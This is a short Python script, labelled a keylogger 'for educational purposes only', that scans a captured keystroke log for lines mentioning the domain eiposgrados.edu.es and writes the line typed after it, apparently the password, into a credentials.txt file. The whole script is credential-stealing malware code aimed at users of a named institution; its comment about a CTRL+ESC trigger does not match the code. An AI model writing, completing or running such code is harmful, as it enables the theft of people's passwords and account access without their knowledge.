# This script is a keylogger for educational purposes only.
# Author: adrihamel

'''
Function to detect if it finds the mail, save the password in a credentials.txt file
Only if the user enter CTRL+ESC
'''

def detectEIPassword():
    position=0
    i = 0
    patron='eiposgrados.edu.es'

    fd = open('keylog.txt', 'r')
    tempFile = fd.readlines()
    fd.close()

    for line in tempFile:
        i += 1
        if patron in line:
            position = i
            fd = open('credentials.txt', 'a')
            fd.write(tempFile[position])
            fd.close()
